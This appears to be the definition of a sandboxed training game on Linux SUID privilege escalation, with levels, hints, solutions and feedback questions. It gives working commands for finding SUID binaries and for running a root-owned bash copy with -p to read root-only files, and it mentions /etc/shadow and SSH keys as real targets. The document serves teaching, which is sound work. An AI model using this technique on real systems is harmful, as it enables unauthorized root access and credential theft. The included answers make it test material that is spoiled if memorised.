title: SUID Privilege Escalation
description: Learn to discover and exploit SUID binaries to escalate privileges on a Linux server.
outcomes: Understand what the SUID bit is and why it is dangerous when set on a shell binary.
Use find to enumerate SUID binaries on a system.
Exploit a misconfigured SUID binary to read files protected by root.

levels.title: Introduction
levels.content:
# General information — please read carefully

* The result of each level is needed to complete the next one. Do not skip ahead.
* If you get stuck, use the hints or Google.
* This game is for educational purposes only. Only attack systems within this sandbox.

# Storyline

You are a penetration tester contracted by NovaTech Solutions to audit their backup server. The IT team has handed you a low-privilege account — `trainee` — and asked you to see how far you can get. During a recent change window, a careless sysadmin installed a 'debug shell' on the server and forgot to remove it. Your job: find it, exploit it, and prove you can read root's files.

levels.title: Get Access
levels.cloud_content:
SSH to the attacker machine at **10.1.28.23** using your assigned credentials, then connect to the target server:

```
ssh trainee@10.1.28.10
Password: letmein123
```

The target server is at **10.1.28.10**. Do not attack anything outside this sandbox. Submit **start** to begin.
levels.local_content:
SSH directly to the target server:

```
ssh -p 2222 trainee@127.0.0.1
Password: letmein123
```

Submit **start** to begin.

levels.title: Find the SUID Binary
levels.content:
You are now logged in as `trainee` on the NovaTech backup server. You have very limited privileges — you cannot read `/root/` or any admin files.

One of the most common privilege escalation vectors on Linux is a misconfigured **SUID binary**. When a binary has the SUID (Set User ID) bit set and is owned by root, it runs as root regardless of who executes it. Attackers search for non-standard SUID binaries that should not be there.

To list all SUID binaries on the system:

```
find / -perm -4000 -type f 2>/dev/null
```

Look at the output carefully. Most SUID binaries are standard system utilities (`sudo`, `passwd`, `su`). One binary in `/usr/local/bin/` does not belong there.

**What is the filename (not full path) of the suspicious non-standard SUID binary?**
levels.solution:
```
trainee@server:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/local/bin/suid-shell
```

The suspicious binary is **suid-shell** — everything else is a standard system utility.

hints.title: What command finds SUID binaries?
hints.content: Use `find` with the `-perm` flag. The SUID bit in numeric mode is `4000`. To find files with this bit set: `find / -perm -4000 -type f 2>/dev/null`

hints.title: What does the output look like?
hints.content: Most results will be in `/usr/bin/` — those are expected. Look for anything in `/usr/local/bin/` which is where local custom binaries live.

levels.title: Confirm Root Access
levels.content:
You found `/usr/local/bin/suid-shell`. It is owned by root and has the SUID bit set.

This binary is a copy of bash. On modern Linux systems, bash drops its elevated privileges by default when it detects that the effective UID differs from the real UID — a safety measure. However, the **`-p` (privileged) flag** disables this protection and keeps the root effective UID.

Run the binary with `-p` and ask it who it is running as:

```
/usr/local/bin/suid-shell -p -c 'whoami'
```

Note the sysadmin's maintenance note in your home directory (`cat ~/note.txt`) — it confirms a debug shell was deliberately left here.

**What username does the `whoami` command return when run through suid-shell -p?**
levels.solution:
```
trainee@server:~$ /usr/local/bin/suid-shell -p -c 'whoami'
root
```

The binary runs as **root** because of the SUID bit and the `-p` flag.

hints.title: Which flag keeps bash's elevated privileges?
hints.content: Bash drops SUID privileges by default. The `-p` flag (privileged mode) prevents this. Try: `/usr/local/bin/suid-shell -p -c 'whoami'`

hints.title: What should the answer be?
hints.content: If SUID is working correctly, you are running as the file's owner. Check who owns `suid-shell` with `ls -la /usr/local/bin/suid-shell`.

levels.title: Read the Root Flag
levels.content:
You have confirmed that `/usr/local/bin/suid-shell -p` gives you an effective UID of root. The flag is stored in `/root/flag.txt`, owned by root with permissions `0400` — no one but root can read it directly.

Use your root access to read it:

```
/usr/local/bin/suid-shell -p -c 'cat /root/flag.txt'
```

In a real engagement this same technique lets an attacker read `/etc/shadow`, SSH private keys, database credentials, or any other root-protected file on the system.

**Submit the flag from `/root/flag.txt`.**

hints.title: How to read a file with the SUID shell?
hints.content: Use the same pattern as the previous level: `/usr/local/bin/suid-shell -p -c 'cat /path/to/file'`

levels.title: Feedback
levels.instructions: Please answer the questions below to help us improve this game.

questions.text: How difficult did you find this game?
Before this game, were you aware that SUID binaries could be exploited?

choices.text: No, this was new to me

questions.text: How would you rate the clarity of the level instructions?
What would you change or add to improve this game?
